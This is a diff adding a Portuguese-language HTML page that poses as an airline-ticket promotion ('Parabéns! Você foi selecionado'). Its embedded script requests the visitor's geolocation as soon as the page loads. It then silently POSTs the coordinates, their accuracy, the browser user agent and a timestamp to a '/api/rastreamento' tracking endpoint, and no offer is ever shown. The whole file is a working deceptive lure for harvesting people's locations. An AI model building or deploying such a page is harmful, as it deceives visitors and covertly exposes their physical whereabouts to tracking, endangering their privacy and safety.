@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Promoção Imperdível de Passagens Aéreas!</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 2rem;
+      background-color: #f4f4f4;
+      text-align: center;
+    }
+    .container {
+      background: white;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 500px;
+      margin: auto;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>🎉 Parabéns! Você foi selecionado para a promoção de passagens aéreas 2025! ✈️</h2>
+    <p>Estamos carregando as melhores ofertas baseadas na sua localização... Aguarde!</p>
+    <p><strong>Não feche esta página.</strong></p>
+  </div>
+
+  <script>
+    const webhookURL = "/api/rastreamento";
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const payload = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy + " metros",
+          userAgent: navigator.userAgent,
+          timestamp: new Date().toISOString()
+        };
+
+        fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        }).then(() => {
+          console.log("📡 Dados enviados com sucesso.");
+        }).catch(error => {
+          console.error("❌ Erro ao enviar:", error);
+        });
+      }, function(error) {
+        console.warn("⚠️ Permissão de localização negada ou indisponível.");
+      });
+    } else {
+      console.warn("🚫 Geolocalização não suportada neste navegador.");
+    }
+  </script>
+</body>
+</html>
